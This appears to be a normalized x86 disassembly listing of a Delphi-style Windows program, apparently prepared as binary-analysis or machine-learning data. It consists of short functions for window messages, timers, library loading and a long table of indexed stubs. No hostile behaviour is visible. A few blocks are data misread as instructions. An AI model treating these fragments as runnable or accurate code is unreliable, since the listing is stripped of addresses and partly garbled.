sub_44eb08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e878
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_44ed70
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_446b38
sub_44ee5b
jmp sub_40382c
sub_44ee62
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ee68
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_44e650
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_44eec0
call sub_44fbe8
retn
sub_44f30d
jmp sub_40382c
sub_44f314
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f610
jmp sub_403578
j_sub_403578#7
jmp sub_403578
sub_44faa5
jmp sub_40382c
sub_44faac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fac9
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
sub_44fac2
jmp sub_40382c
sub_44fac9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44fad0
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_421ba0
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44c518
sub_44faf0
call sub_4030f0
retn
sub_44fb48
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44fbae
jmp sub_40382c
sub_44fd5c
jmp sub_403578
sub_44fd88
xor edx edx
call sub_44c87c
retn
sub_44fd90
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_44c87c
mov eax ebx
call sub_433bd0
pop ebx
retn
sub_44fe16
jmp sub_40382c
sub_44fe1d
pop ebx
pop ecx
pop ebp
retn
sub_44fe24
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_43a170
push eax
call PostMessageA
pop ebx
retn
sub_450028
jmp sub_40382c
sub_4500c9
jmp sub_40382c
sub_4500d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500f2
mov eax [ rw-data ]
call sub_45230c
retn
sub_4500eb
jmp sub_40382c
sub_4500f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45010f
lea eax [ ebp - 0x20 ]
call sub_403eac
retn
sub_450108
jmp sub_40382c
sub_45010f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4501f0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_432d7c
retn
mov edx eax
mov eax [ rw-data ]
call sub_451960
retn
sub_450574
mov edx eax
mov eax [ rw-data ]
call sub_453380
mov al 0x1
retn
sub_45065c
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_450584
sub_450670
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_450584
sub_450684
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_450584
sub_450698
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_450584
sub_4506ac
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_450817
jmp sub_40382c
sub_45081e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450824
push ebx
mov ebx eax
mov eax ebx
call sub_438a88
mov eax ebx
call sub_438c0c
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44fe24
sub_450a9a
jmp sub_40382c
sub_450aa1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450aa8
push ebx
mov ebx edx
mov edx ebx
call sub_438ef0
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_432e84
pop ebx
retn
sub_450afc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_450b64
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_450b14
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_450b64
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_450b30
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_450b64
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_450b48
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_450b64
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_450de4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_450df0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_450dfc
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_450e08
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_450e14
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_450e20
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_450e2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_413860
pop esi
pop ebx
retn
sub_450e40
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_450e5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413860
pop esi
pop ebx
retn
sub_450e70
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_450e78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413860
pop esi
pop ebx
retn
sub_450e8c
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_450f68
mov eax [ eax + 0x54 ]
call sub_413704
retn
sub_450f74
mov eax [ eax + 0x54 ]
call sub_4139fc
retn
sub_4511c7
jmp sub_40382c
sub_45120b
jmp sub_40382c
sub_451212
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_451260
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_451060
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f00
pop esi
pop ebx
retn
sub_4512cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_413860
pop esi
pop ebx
retn
sub_4512e0
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4514e5
jmp sub_40382c
sub_4514ec
pop ebx
mov esp ebp
pop ebp
retn
sub_4514f4
inc [ eax + 0x8c ]
retn
sub_4514fc
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45151c
sub_45151c
xor edx edx
call sub_451960
retn
sub_451952
jmp sub_40382c
sub_4519d9
jmp sub_40382c
sub_4519e8
add eax 0x30
call sub_40cb14
retn
sub_451a2c
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_403578#6
jmp sub_403578
sub_451a82
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_452151
jmp sub_40382c
sub_452158
pop ebx
mov esp ebp
pop ebp
retn
sub_4522e0
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45230c
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_452338
xor edx edx
call sub_452230
retn
sub_452340
mov dl 0x1
call sub_452230
retn
sub_4523b4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4523cc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_452499
jmp sub_40382c
sub_4524a0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452bea
jmp sub_403578
sub_4531e8
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403578#5
jmp sub_403578
sub_453325
jmp sub_403578
sub_45335e
jmp sub_40382c
sub_453365
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45336c
call sub_40c664
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_453565
jmp sub_40382c
sub_45356c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_453633
jmp sub_40382c
sub_45363a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453810
jmp sub_40382c
sub_453817
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453878
jmp sub_40382c
sub_45387f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453888
call sub_453650
retn
j_sub_403578#4
jmp sub_403578
sub_453acc
jmp sub_40382c
sub_453ad3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453c01
jmp sub_40382c
sub_453d60
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45405f
jmp sub_40382c
sub_45408e
jmp sub_40382c
sub_45419a
jmp sub_40382c
sub_4541a1
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454532
jmp sub_40382c
sub_454539
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45457c
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_4546ac
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4546f7
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_454708
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_454718
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45478b
jmp sub_40382c
sub_454792
pop ebp
retn
sub_454794
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_454728
call sub_403bfc
call sub_4546ac
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44a408
call sub_413354
sub_455229
jmp sub_40382c
sub_455230
pop ebp
retn
sub_455234
sub [ rw-data ] 0x1
retn
sub_455509
jmp sub_40382c
sub_455510
pop ebp
retn
sub_455514
sub [ rw-data ] 0x1
retn
sub_455634
jmp sub_40382c
sub_45566c
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_4564cc
sub_455688
mov eax 0x0
call sub_456418
jmp eax
sub_455694
retn
sub_455698
mov eax 0x1
call sub_456418
jmp eax
sub_4556a4
retn
sub_4556a8
mov eax 0x2
call sub_456418
jmp eax
sub_4556b4
retn
sub_4556b8
mov eax 0x3
call sub_456418
jmp eax
sub_4556c4
retn
sub_4556c8
mov eax 0x4
call sub_456418
jmp eax
sub_4556d4
retn
sub_4556d8
mov eax 0x5
call sub_456418
jmp eax
sub_4556e4
retn
sub_4556e8
mov eax 0x6
call sub_456418
jmp eax
sub_4556f4
retn
sub_4556f8
mov eax 0x7
call sub_456418
jmp eax
sub_455704
retn
sub_455708
mov eax 0x8
call sub_456418
jmp eax
sub_455714
retn
sub_455718
mov eax 0x9
call sub_456418
jmp eax
sub_455724
retn
sub_455728
mov eax 0xa
call sub_456418
jmp eax
sub_455734
retn
sub_455738
mov eax 0xb
call sub_456418
jmp eax
sub_455744
retn
sub_455748
mov eax 0xc
call sub_456418
jmp eax
sub_455754
retn
sub_455758
mov eax 0xd
call sub_456418
jmp eax
sub_455764
retn
sub_455768
mov eax 0xe
call sub_456418
jmp eax
sub_455774
retn
sub_455778
mov eax 0xf
call sub_456418
jmp eax
sub_455784
retn
sub_455788
mov eax 0x10
call sub_456418
jmp eax
sub_455794
retn
sub_455798
mov eax 0x11
call sub_456418
jmp eax
sub_4557a4
retn
sub_4557a8
mov eax 0x12
call sub_456418
jmp eax
sub_4557b4
retn
sub_4557b8
mov eax 0x13
call sub_456418
jmp eax
sub_4557c4
retn
sub_4557c8
mov eax 0x14
call sub_456418
jmp eax
sub_4557d4
retn
sub_4557d8
mov eax 0x15
call sub_456418
jmp eax
sub_4557e4
retn
sub_4557e8
mov eax 0x16
call sub_456418
jmp eax
sub_4557f4
retn
sub_4557f8
mov eax 0x17
call sub_456418
jmp eax
sub_455804
retn
sub_455808
mov eax 0x18
call sub_456418
jmp eax
sub_455814
retn
sub_455818
mov eax 0x19
call sub_456418
jmp eax
sub_455824
retn
sub_455828
mov eax 0x1a
call sub_456418
jmp eax
sub_455834
retn
sub_455838
mov eax 0x1b
call sub_456418
jmp eax
sub_455844
retn
sub_455848
mov eax 0x1c
call sub_456418
jmp eax
sub_455854
retn
sub_455858
mov eax 0x1d
call sub_456418
jmp eax
sub_455864
retn
sub_455868
mov eax 0x1e
call sub_456418
jmp eax
sub_455874
retn
sub_455878
mov eax 0x1f
call sub_456418
jmp eax
sub_455884
retn
sub_455888
mov eax 0x20
call sub_456418
jmp eax
sub_455894
retn
sub_455898
mov eax 0x21
call sub_456418
jmp eax
sub_4558a4
retn
sub_4558a8
mov eax 0x22
call sub_456418
jmp eax
sub_4558b4
retn
sub_4558b8
mov eax 0x23
call sub_456418
jmp eax
sub_4558c4
retn
sub_4558c8
mov eax 0x24
call sub_456418
jmp eax
sub_4558d4
retn
sub_4558d8
mov eax 0x25
call sub_456418
jmp eax
sub_4558e4
retn
sub_4558e8
mov eax 0x26
call sub_456418
jmp eax
sub_4558f4
retn
sub_4558f8
mov eax 0x27
call sub_456418
jmp eax
sub_455904
retn
sub_455908
mov eax 0x28
call sub_456418
jmp eax
sub_455914
retn
sub_455918
mov eax 0x29
call sub_456418
jmp eax
sub_455924
retn
sub_455928
mov eax 0x2a
call sub_456418
jmp eax
sub_455934
retn
sub_455938
mov eax 0x2b
call sub_456418
jmp eax
sub_455944
retn
sub_455948
mov eax 0x2c
call sub_456418
jmp eax
sub_455954
retn
sub_455958
mov eax 0x2d
call sub_456418
jmp eax
sub_455964
retn
sub_455968
mov eax 0x2e
call sub_456418
jmp eax
sub_455974
retn
sub_455978
mov eax 0x2f
call sub_456418
jmp eax
sub_455984
retn
sub_455988
mov eax 0x30
call sub_456418
jmp eax
sub_455994
retn
sub_455998
mov eax 0x31
call sub_456418
jmp eax
sub_4559a4
retn
sub_4559a8
mov eax 0x32
call sub_456418
jmp eax
sub_4559b4
retn
sub_4559b8
mov eax 0x33
call sub_456418
jmp eax
sub_4559c4
retn
sub_4559c8
mov eax 0x34
call sub_456418
jmp eax
sub_4559d4
retn
sub_4559d8
mov eax 0x35
call sub_456418
jmp eax
sub_4559e4
retn
sub_4559e8
mov eax 0x36
call sub_456418
jmp eax
sub_4559f4
retn
sub_4559f8
mov eax 0x37
call sub_456418
jmp eax
sub_455a04
retn
sub_455a08
mov eax 0x38
call sub_456418
jmp eax
sub_455a14
retn
sub_455a18
mov eax 0x39
call sub_456418
jmp eax
sub_455a24
retn
sub_455a28
mov eax 0x3a
call sub_456418
jmp eax
sub_455a34
retn
sub_455a38
mov eax 0x3b
call sub_456418
jmp eax
sub_455a44
retn
sub_455a48
mov eax 0x3c
call sub_456418
jmp eax
sub_455a54
retn
sub_455a58
mov eax 0x3d
call sub_456418
jmp eax
sub_455a64
retn
sub_455a68
mov eax 0x3e
call sub_456418
jmp eax
sub_455a74
retn
sub_455a78
mov eax 0x3f
call sub_456418
jmp eax
sub_455a84
retn
sub_455a88
mov eax 0x40
call sub_456418
jmp eax
sub_455a94
retn
sub_455a98
mov eax 0x41
call sub_456418
jmp eax
sub_455aa4
retn
sub_455aa8
mov eax 0x42
call sub_456418
jmp eax
sub_455ab4
retn
sub_455ab8
mov eax 0x43
call sub_456418
jmp eax
sub_455ac4
retn
sub_455ac8
mov eax 0x44
call sub_456418
jmp eax
sub_455ad4
retn
sub_455ad8
mov eax 0x45
call sub_456418
jmp eax
sub_455ae4
retn
sub_455ae8
mov eax 0x46
call sub_456418
jmp eax
sub_455af4
retn
sub_455af8
mov eax 0x47
call sub_456418
jmp eax
sub_455b04
retn
sub_455b08
mov eax 0x48
call sub_456418
jmp eax
sub_455b14
retn
sub_455b18
mov eax 0x49
call sub_456418
jmp eax
sub_455b24
retn
sub_455b28
mov eax 0x4a
call sub_456418
jmp eax
sub_455b34
retn
sub_455b38
mov eax 0x4b
call sub_456418
jmp eax
sub_455b44
retn
sub_455b48
mov eax 0x4c
call sub_456418
jmp eax
sub_455b54
retn
sub_455b58
mov eax 0x4d
call sub_456418
jmp eax
sub_455b64
retn
sub_455b68
mov eax 0x4e
call sub_456418
jmp eax
sub_455b74
retn
sub_455b78
mov eax 0x4f
call sub_456418
jmp eax
sub_455b84
retn
sub_455b88
mov eax 0x50
call sub_456418
jmp eax
sub_455b94
retn
sub_455b98
mov eax 0x51
call sub_456418
jmp eax
sub_455ba4
retn
sub_455ba8
mov eax 0x52
call sub_456418
jmp eax
sub_455bb4
retn
sub_455bb8
mov eax 0x53
call sub_456418
jmp eax
sub_455bc4
retn
sub_455bc8
mov eax 0x54
call sub_456418
jmp eax
sub_455bd4
retn
sub_455bd8
mov eax 0x55
call sub_456418
jmp eax
sub_455be4
retn
sub_455be8
mov eax 0x56
call sub_456418
jmp eax
sub_455bf4
retn
sub_455bf8
mov eax 0x57
call sub_456418
jmp eax
sub_455c04
retn
sub_455c08
mov eax 0x58
call sub_456418
jmp eax
sub_455c14
retn
sub_455c18
mov eax 0x59
call sub_456418
jmp eax
sub_455c24
retn
sub_455c28
mov eax 0x5a
call sub_456418
jmp eax
sub_455c34
retn
sub_455c38
mov eax 0x5b
call sub_456418
jmp eax
sub_455c44
retn
sub_455c48
mov eax 0x5c
call sub_456418
jmp eax
sub_455c54
retn
sub_455c58
mov eax 0x5d
call sub_456418
jmp eax
sub_455c64
retn
sub_455c68
mov eax 0x5e
call sub_456418
jmp eax
sub_455c74
retn
sub_455c78
mov eax 0x5f
call sub_456418
jmp eax
sub_455c84
retn
sub_455c88
mov eax 0x60
call sub_456418
jmp eax
sub_455c94
retn
sub_455c98
mov eax 0x61
call sub_456418
jmp eax
sub_455ca4
retn
sub_455ca8
mov eax 0x62
call sub_456418
jmp eax
sub_455cb4
retn
sub_455cb8
mov eax 0x63
call sub_456418
jmp eax
sub_455cc4
retn
sub_455cc8
mov eax 0x64
call sub_456418
jmp eax
sub_455cd4
retn
sub_455cd8
mov eax 0x65
call sub_456418
jmp eax
sub_455ce4
retn
sub_455ce8
mov eax 0x66
call sub_456418
jmp eax
sub_455cf4
retn
sub_455cf8
mov eax 0x67
call sub_456418
jmp eax
sub_455d04
retn
sub_455d08
mov eax 0x68
call sub_456418
jmp eax
sub_455d14
retn
sub_455d18
mov eax 0x69
call sub_456418
jmp eax
sub_455d24
retn
sub_455d28
mov eax 0x6a
call sub_456418
jmp eax
sub_455d34
retn
sub_455d38
mov eax 0x6b
call sub_456418
jmp eax
sub_455d44
retn
sub_455d48
mov eax 0x6c
call sub_456418
jmp eax
sub_455d54
retn
sub_455d58
mov eax 0x6d
call sub_456418
jmp eax
sub_455d64
retn
sub_455d68
mov eax 0x6e
call sub_456418
jmp eax
sub_455d74
retn
sub_455d78
mov eax 0x6f
call sub_456418
jmp eax
sub_455d84
retn
sub_4564bb
jmp sub_40382c
sub_4564c2
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4565bd
jmp sub_40382c
sub_4565c4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_456628
jmp sub_40382c
sub_45662f
pop ebp
retn
sub_456634
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4564cc
sub_456669
jmp sub_40382c
sub_456670
pop ebp
retn
sub_456674
sub [ rw-data ] 0x1
retn
sub_456900
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_45690c
retn
sub_4569b3
jmp sub_40382c
sub_4569ba
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_456a12
jmp sub_40382c
sub_456a19
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456a20
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_456a40
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_456ebe
jmp sub_40382c
sub_456ec5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456fb7
jmp sub_40382c
sub_456fbe
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45704c
jmp sub_40382c
sub_457053
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457081
jmp sub_40382c
sub_457088
pop ebp
retn
sub_45708c
sub [ rw-data ] 0x1
retn
sub_457286
jmp sub_40382c
sub_45728d
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_457368
jmp sub_40382c
sub_45736f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457403
jmp sub_40382c
sub_45740a
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_457480
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4575c4
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457677
jmp sub_40382c
sub_45767e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_457759
jmp sub_40382c
sub_457760
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45794c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457958
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_457970
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45797c
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_4036a4#4
jmp sub_4036a4
sub_457a55
jmp sub_40382c
sub_457a5c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403578#3
jmp sub_403578
sub_457b85
jmp sub_40382c
sub_457b8c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457b98
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457ba4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457c4a
jmp sub_40382c
sub_457c51
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457d0d
jmp sub_40382c
sub_457d14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457d31
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_457d2a
jmp sub_40382c
sub_457d31
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_457dff
jmp sub_40382c
sub_457e06
pop ebx
mov esp ebp
pop ebp
retn
sub_457e0f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457eb2
jmp sub_40382c
sub_457eb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_457f52
jmp sub_40382c
sub_457f59
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_457fde
jmp sub_40382c
sub_457fe5
pop ecx
pop ebp
retn
sub_457fe8
mov eax [ eax + 0x4 ]
retn
sub_458046
jmp sub_40382c
sub_45804d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_458129
jmp sub_40382c
sub_458130
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458171
jmp sub_40382c
sub_458178
pop ebp
retn
sub_45817c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_457094 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_457c74
sub_4581cd
jmp sub_40382c
sub_4581d4
pop ebp
retn
sub_4581d8
sub [ rw-data ] 0x1
retn
sub_45830c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40be58
pop esi
pop ebx
retn
sub_458320
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_45846b
jmp sub_40382c
sub_458472
pop ebx
pop ecx
pop ebp
retn
sub_458541
jmp sub_40382c
sub_458548
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_458618
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_45862c
call sub_4044b0
retn
sub_4586e7
jmp sub_40382c
sub_4586ee
pop ebp
retn
sub_4587c3
jmp sub_40382c
sub_4587ca
pop ecx
pop ebp
retn
sub_4588f8
retn
j_sub_4588f8
jmp sub_4588f8
sub_458900
pop ebp
retn
sub_458904
sub [ rw-data ] 0x1
retn
sub_458b03
jmp sub_40382c
sub_458b0a
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_458be5
jmp sub_40382c
sub_458bec
pop ebp
retn
sub_458bf0
sub [ rw-data ] 0x1
retn
sub_458e4a
jmp sub_40382c
sub_458e51
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_458ed7
jmp sub_40382c
sub_458ede
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40344c
sub_458f9b
jmp sub_40382c
sub_458fa2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4590d3
pop ebp
retn
sub_459125
jmp sub_40382c
sub_45912c
pop ebp
retn
sub_459130
sub [ rw-data ] 0x1
retn
sub_459138
test [ ecx + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_45921c
retn
sub_459220
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_459254
retn
sub_459258
retn
sub_459281
jmp sub_40382c
sub_459288
pop ebp
retn
sub_45928c
sub [ rw-data ] 0x1
retn
sub_459795
jmp sub_40382c
sub_45979c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036a4#3
jmp sub_4036a4
sub_459860
add [ eax ] eax
add [ eax ] al
xor al 0x6d
inc eax
add [ eax + ebx * 4 + 0x45 ] ch
add [ ebp - 0x1136b ] cl
jmp [ ecx + rw-data ]
j_sub_4036a4#5
jmp sub_4036a4
sub_4599c1
jmp [ ecx + rw-data ]
sub_459ae7
jmp sub_403578
sub_459d38
jmp sub_403578
sub_459d87
jmp sub_40382c
sub_459d8e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459dd9
jmp sub_40382c
sub_459de0
pop ebp
retn
sub_459de4
sub [ rw-data ] 0x1
retn
sub_45a37c
jmp sub_40382c
sub_45a383
pop ebx
mov esp ebp
pop ebp
retn
sub_45a584
jmp sub_40382c
sub_45a5a1
jmp sub_40382c
sub_45a5a8
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a721
jmp sub_40382c
sub_45a728
pop ebp
retn
sub_45a72c
sub [ rw-data ] 0x1
retn
sub_45a759
jmp sub_40382c
sub_45a760
pop ebp
retn
sub_45a764
sub [ rw-data ] 0x1
retn
sub_45a791
jmp sub_40382c
sub_45a798
pop ebp
retn
sub_45a79c
sub [ rw-data ] 0x1
retn
sub_45a7c9
jmp sub_40382c
